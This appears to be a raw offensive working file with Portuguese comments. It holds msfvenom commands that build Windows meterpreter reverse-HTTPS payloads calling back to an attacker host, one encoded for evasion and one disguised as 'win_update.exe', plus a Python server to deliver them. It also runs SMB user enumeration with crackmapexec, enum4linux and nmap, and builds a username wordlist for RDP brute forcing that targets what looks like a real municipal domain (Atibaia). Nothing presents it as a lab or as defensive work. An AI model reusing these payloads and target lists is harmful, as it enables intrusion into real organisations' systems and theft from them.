msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

crackmapexec smb 192.168.1.84 --users

nano userlist_atibaia_rdp.txt

# Gerar uma wordlist atualizada de usuários, incluindo os descobertos pelo enum4linux

usernames_updated = [
    "admin", "administrator", "atibaia", "servidor", "sumas", "sumas57667", "prefeitura",
    "contas", "financeiro", "user01", "user02", "secretaria", "ti", "tecnico", "suporte",
    "gestor", "coordenador", "responsavel", "servidor1", "servidor2", "atibaia.local",
    "a.sumas", "dirigente", "adm.atibaia", "servidor.atibaia", "admin.sumas", "diretoria",
    "admin.ti", "servidor.ti", "guest", "krbtgt", "domain_admins", "root", "bin", "none"
]

# Salvar a nova wordlist em arquivo
userlist_updated_path = "/mnt/data/userlist_atibaia_rdp_atualizada.txt"
with open(userlist_updated_path, "w") as f:
    for user in usernames_updated:
        f.write(user + "\n")

userlist_updated_path



nano brute_force_vnc.py

#!/usr/bin/env python3
import os
import subprocess

def enumerate_users(ip):
    print(f"[+] Enumerando usuários via enum4linux em {ip}...")
    subprocess.run(["enum4linux", "-a", ip])

    print(f"[+] Tentando enumerar usuários via crackmapexec em {ip}...")
    subprocess.run(["crackmapexec", "smb", ip, "--users"])

    print(f"[+] Tentando enumeração via Nmap em {ip}...")
    subprocess.run(["nmap", "-p", "445", "--script", "smb-enum-users", ip])

if __name__ == "__main__":
    target_ip = input("Digite o IP do alvo para enumerar usuários: ")
    enumerate_users(target_ip)

    

